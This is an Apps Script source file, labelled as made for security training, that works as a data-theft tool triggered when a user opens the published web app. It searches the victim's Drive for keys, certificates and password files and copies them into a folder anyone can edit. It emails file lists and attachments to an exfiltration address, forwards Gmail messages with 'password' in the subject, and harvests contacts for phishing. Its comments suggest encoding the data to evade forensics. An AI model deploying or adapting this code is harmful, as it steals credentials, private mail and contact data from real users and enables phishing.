// Created by Greg Carson @ Feb 2017
// ---------------------------------------
// Play nice and use for security training
// and testing.

function drivePassSearch() {
  
  // This creates a PUBLICALLY AVAILABLE RWX FOLDER in Drive under the executing users context.
  // This can be disabled for Google Apps for Business users:
  // https://support.google.com/a/answer/60781?hl=en
  // Personal users shit out of luck? Not sure haven't looked into it.
  
  var folder = DriveApp.createFolder('Evil Folder');
  folder.setSharing(DriveApp.Access.ANYONE, DriveApp.Permission.EDIT);
 
  // Construct malicious search query on drive. Look for PDFs? DOC/XLS files? If you are looking for an extension use 'title contains'
  // If you want to search through content for a keyword use 'fullText contains' instead
  // You can construct more complex queries using logical operators, for example: 'and (mimeType contains 'image/' or mimeType contains 'video/')'
  // Not aware of case sensitivity or ability to perform regular expressions
  // Search Ideas? title contains .cer .pem .der .crt .pub id_rsa .docx .xlsx .vsd password .nessus ntds.dit 
  // or fullText contains password or any other combination of keywords of interest such as target individuals, target servers, etcetera
  
  var files = DriveApp.searchFiles(
     'modifiedDate > "2013-02-28" and title contains "SEARCHTERMHERE"');
 while (files.hasNext()) {
   var file = files.next();
   Logger.log(file.getDownloadUrl());
   Logger.log(file.getUrl());
   Logger.log(file.getName());
   var name = file.getName();
   file.makeCopy(name,folder);
   Logger.log(file.getDownloadUrl());
   Logger.log(file.getUrl());
   
 }

  // Write Logger data to body of email and send to specified recipient
  // Sender address is the current active user
   
  Logger.log(folder.getUrl());
  var recipient = "RECPIENT-EXFIL-EMAIL-ADDRESS-HERE";
  var subject = 'Google Drive Query - KDBX';
  var body = Logger.getLog();
  MailApp.sendEmail(recipient, subject, body);
  
  // If the organization has disabled publically accessible folders in Drive you can use this instead.
  // Get file, attach file as blob to email and send to recipient.
  // Beware, if the query finds multiple files, it will send each one in a separate email. 
  // This step probably would require two stages, use searchFiles as above to find files, then feed each matching file
  // in a while loop to get the blob and send an email. Use case below is just an example of finding a specific file and sending it.
  
  // ***** IMPORTANT *****
  // Comment out these lines if you do not want to perform direct file attachment and exfil as this will send a lot of emails. 
  
  var file = DriveApp.getFilesByName('FILENAME.EXT'); // ** UPDATE THIS SEARCH FIELD
  var fileBlob = file.next().getBlob();
  if (file.hasNext()) {
    MailApp.sendEmail(recipient,'Google Drive search - Attached Files','Attached file matched a search term during Google Drive app script search.',{attachments: [fileBlob], name: file.next().getName()})
  }
  
   Logger.clear();

}

// The search functionality is essentially what you are used to using in the search box in the Gmail UI
// https://support.google.com/mail/answer/7190?hl=en
// Examples... is:important has:attachment Keyword 
// Search iterates through all matches and forwards them.

function gmailKeySearch() {
  
  var threads = GmailApp.search('subject:password'); // *** UPDATE THIS SEARCH FIELD
  for (var h = 0; h < threads.length; h++) {
    var messages = threads[h].getMessages();
    for (var i = 0; i < messages.length; i++) {
      if (messages[i].isStarred())
      {
        // Could probably introduce some basic XOR functionality or ROT13 to encode data before sending
        // Mail forensics would have difficulty discerning what data left the organization since we aren't actually forwarding an email
        Logger.log(messages[i].getSubject());
        var subject = messages[i].getSubject();
        Logger.log(messages[i].getBody());
        var body = messages[i].getBody();
        Logger.log(messages[i].getId());
        var id = messages[i].getId();
        MailApp.sendEmail({
          to: "greg.carson@tmx.com",
          subject: subject,
          htmlBody: body,
       }); 
          }
      }
    }
}

// Create a contact list from current user and exfil.
// Useful in rephish efforts or creating larger distribution lists for targetting.

function contactsRePhish() {
  
  var contacts = ContactsApp.getContacts();
  
  // Only pulling name and primary email, but contacts fields have address, phone number, etc, tons of useful information in targeting an organization.
  
  for (var i=0; i<contacts.length; i++) {   
    var name = contacts[i].getFullName();    
    var email = contacts[i].getPrimaryEmail();
    
    // ******* In this section you could add a sendEmail one liner that fires off a message, as the current active user, to other internal users, directing them
    // to a phishing site, or download an application, or whatever scheme you can devise.  I am just recording the list of users and sending that back. ********* 
    
    Logger.log("Name: "+name+" Email: "+email);
  }

  var recipient = "RECPIENT-EXFIL-EMAIL-ADDRESS-HERE";
  var subject = 'Full List of Contacts';
  var body = Logger.getLog();
  MailApp.sendEmail(recipient, subject, body);
  
  Logger.clear();  

}

// Application Entry Point
// Application published to web requires doGet or doPost

function doGet(e) {
  var params = JSON.stringify(e);
  drivePassSearch();
  gmailKeySearch();
  contactsRePhish();
  return HtmlService.createHtmlOutput('Index');
}
